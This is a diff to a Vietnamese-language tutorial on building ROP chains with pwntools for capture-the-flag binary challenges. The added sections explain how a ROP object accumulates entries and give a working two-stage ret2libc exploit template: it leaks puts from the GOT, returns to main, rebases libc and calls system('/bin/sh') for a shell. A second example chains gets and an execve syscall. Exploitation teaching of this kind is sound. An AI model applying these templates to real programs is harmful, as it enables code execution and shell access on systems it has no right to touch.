@@ -25,6 +25,44 @@ rop = ROP([exe, libc])         # gộp gadget từ nhiều ELF
 
 ---
 
+## Cơ chế: `rop` là một cái GIỎ có trạng thái
+
+Hiểu nhầm phổ biến: tưởng `rop.chain()` "tự hiểu" từ đâu. Thực ra **`rop` là object giữ trạng
+thái**. Mỗi lệnh dưới đây **KHÔNG trả về bytes** — chúng *bỏ thêm một mục vào giỏ `rop`*:
+
+```python
+rop = ROP(exe)          # giỏ rỗng
+rop.call('gets', [rw])  # bỏ "gọi gets(rw)" vào giỏ      -> trả về None
+rop(rax=0x3b, rdi=rw)   # bỏ "set thanh ghi" vào giỏ     -> trả về None
+rop.raw(syscall_addr)   # bỏ "chèn thẳng địa chỉ" vào giỏ -> trả về None
+```
+
+Chỉ tới khi bạn **lấy đồ ra khỏi giỏ** mới sinh bytes — và lúc đó nó duyệt *toàn bộ* mục đã bỏ:
+
+| Lấy ra | Cho ra |
+|--------|--------|
+| `rop.chain()` | **bytes** của cả chain (để nhét vào payload) |
+| `bytes(rop)` | y hệt `rop.chain()` (nên `flat(b'A'*off, rop)` chạy được) |
+| `rop.dump()` | bản in người đọc được (gadget + padding) — để debug |
+
+Đã verify (pwntools 4.15): `chain()` gọi lại **không đổi** nếu không bỏ thêm gì; bỏ thêm 1 mục
+→ `chain()` **dài ra**; `bytes(rop) == rop.chain()`; `ROP(exe)` mới luôn là **giỏ rỗng**.
+
+```python
+rop = ROP(exe); rop.raw(0xdeadbeef)
+print(len(rop.chain()))      # vd 8
+rop.raw(0xcafebabe)
+print(len(rop.chain()))      # 16 — dài ra vì giỏ có thêm mục
+```
+
+> **Mô hình tư duy:** `call/rop()/raw/migrate` = *bỏ vào giỏ*; `chain()/bytes()/dump()` = *lấy
+> ra*. Bạn không "gán vào `chain()`" — bạn đã gán vào `rop` từ trước. Thứ tự bỏ vào = **thứ tự
+> thực thi** (gets trước, syscall sau).
+
+**Không có `rop.clear()`.** Muốn "giỏ mới" thì **tạo `ROP(exe)` mới** (xem mục nhiều chain).
+
+---
+
 ## Ví dụ 1 — gọi hàm (ret2win / ret2plt)
 
 **Dạng bài:** có hàm `win(a, b)` hoặc gọi `system`/`puts`.
@@ -167,6 +205,58 @@ lắt léo, ret2dlresolve gói toàn bộ.
 
 ---
 
+## Nhiều chain / nhiều tầng (leak → rebase → đánh thật)
+
+Mặc định bạn gom mọi mục vào **một `rop`** rồi gửi **một lần** — đó là *một* chain. Nhưng nhiều
+bài phải gửi **nhiều chain nối tiếp**: chain 1 leak libc, chương trình **quay lại `main`/vòng
+lặp**, rồi chain 2 mới dùng địa chỉ vừa leak. Nguyên tắc: **mỗi tầng = một `ROP` mới** (giỏ cũ đã
+"đổ" đi, và tầng 2 thường dựng trên ELF khác — libc).
+
+**Mẫu 2 tầng ret2libc kinh điển** (no-canary, có vòng lặp hoặc chain 1 `ret` về `main`):
+```python
+context.binary = exe = ELF('./chall', checksec=False)
+libc = ELF('./libc.so.6', checksec=False)
+p = process(exe.path)
+
+# --- CHAIN 1: leak địa chỉ thật của puts rồi quay về main ---
+rop1 = ROP(exe)
+rop1.call('puts', [exe.got.puts])     # puts(got.puts) -> in địa chỉ libc ra
+rop1.call(exe.sym.main)               # QUAY LẠI main để còn nhận chain 2
+p.sendlineafter(b'> ', flat(cyclic(OFF), rop1.chain()))
+
+leak = u64(p.recvline().strip().ljust(8, b'\x00'))
+libc.address = leak - libc.sym.puts   # rebase toàn bộ libc theo leak
+
+# --- CHAIN 2: giờ mới có địa chỉ system -> ret2libc thật ---
+rop2 = ROP(libc)                      # GIỎ MỚI, lần này tìm gadget trong libc
+rop2.call('system', [next(libc.search(b'/bin/sh\x00'))])
+p.sendlineafter(b'> ', flat(cyclic(OFF), rop2.chain()))
+p.interactive()
+```
+
+Điểm mấu chốt:
+- **`rop1.call(exe.sym.main)`** ở cuối chain 1 — không có dòng này, chain 1 chạy xong là chương
+  trình thoát, bạn **mất cơ hội gửi chain 2**. Phải "nhảy về" chỗ đọc input lần nữa.
+- **`rop2 = ROP(libc)`** — tầng 2 là *giỏ mới* và dựng trên `libc` (đã rebase) vì gadget/`system`
+  nằm trong libc, không phải exe. Dùng `ROP([exe, libc])` nếu cần gadget cả hai.
+- Mỗi `flat(cyclic(OFF), ropN.chain())` là **một lần gửi** = một chain. N tầng → N lần gửi.
+
+**Gom nhiều việc vào CÙNG một chain (vẫn 1 lần gửi)** — khi *không* cần kết quả tầng trước:
+```python
+rop = ROP(exe)
+rop.call('gets', [rw])          # việc 1
+rop(rax=0x3b, rdi=rw, rsi=0, rdx=0)   # việc 2
+rop.raw(rop.find_gadget(['syscall']).address)  # việc 3
+p.sendline(flat(cyclic(OFF), rop.chain()))      # 1 lần gửi, 3 việc nối nhau
+```
+→ Phân biệt: **nhiều việc trong 1 chain** (nối gadget, gửi 1 phát) khác **nhiều chain** (phải
+chờ output/rebase giữa chừng, gửi nhiều phát, mỗi phát 1 `ROP` mới).
+
+**Khi chỉ có 1 lần ghi (không quay lại được):** không leak-rồi-đánh 2 tầng được → chuyển hướng
+**SROP** (1 frame set hết regs) hoặc **ret2dlresolve** (khỏi cần leak) — xem dưới.
+
+---
+
 ## Mẹo nhanh
 
 - Luôn `print(rop.dump())` trước khi gửi — thấy ngay gadget/padding pwntools chọn.
@@ -174,3 +264,6 @@ lắt léo, ret2dlresolve gói toàn bộ.
 - Thiếu `pop rdx`? pwntools sẽ tự tìm chuỗi `mov`/`xchg` thay thế khi set `rop(rdx=...)`.
 - Gadget có `add rsp, N` → **khỏi tự đệm**, `rop()` lo. Làm tay thì nhớ chèn `b"A"*N`.
 - Ít gadget → nghĩ tới **SROP**; không leak được libc + Partial RELRO → **ret2dlresolve**.
+- **Nhiều việc nối nhau, gửi 1 phát** → cùng 1 `rop`. **Cần output/rebase giữa chừng** → mỗi tầng
+  một `ROP` mới, cuối chain trước nhớ `rop.call(exe.sym.main)` để còn gửi tầng sau.
+- `rop` không tự xoá: `chain()` đọc *cả giỏ*. Muốn làm lại từ đầu → gán `rop = ROP(exe)` mới.
